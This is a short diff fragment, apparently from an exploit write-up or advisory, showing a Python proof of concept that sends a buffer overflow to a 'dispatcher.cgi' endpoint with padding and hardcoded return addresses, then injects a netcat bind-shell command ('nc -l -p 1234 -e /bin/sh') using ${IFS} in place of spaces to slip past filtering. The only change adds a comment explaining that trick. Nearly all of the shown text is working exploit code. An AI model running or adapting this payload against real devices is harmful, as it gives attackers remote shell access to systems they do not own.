@@ -354,7 +354,7 @@ Python script (remote command execution):
 import urllib2
 url = 'http://127.0.0.1/dispatcher.cgi?template=jquery.jsp.pdf.gz' + 'A' * ((0x530-0x28)-len("common.js.pdf.gz")-len("/www/license/")) + '\xE0\x27\xF2\x2A' + 'B' * 32 + '\xA0\xB7\xEF\x2A' + 'C' * 0x18 + "nc${IFS}-l${IFS}-p${IFS}1234${IFS}-e${IFS}/bin/sh"
 urllib2.urlopen(url)
-
+# ${IFS} can act as a space
 
 
 li $a0, 1
